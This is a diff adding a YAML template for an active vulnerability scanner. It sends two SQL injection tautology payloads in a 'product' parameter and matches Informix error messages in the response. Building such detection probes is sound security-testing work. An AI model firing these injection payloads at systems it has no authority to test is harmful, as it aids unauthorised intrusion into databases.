@@ -1,0 +1,22 @@
+id: sqli6-informix-08
+name: 'SQLi informix probe in product'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - informix
+description: 'Triggers informix error via product'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      product:
+        - '") OR ("1"="1'
+        - '1'' AND ''1''=''1'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'Informix'
+          - 'ISAM error'
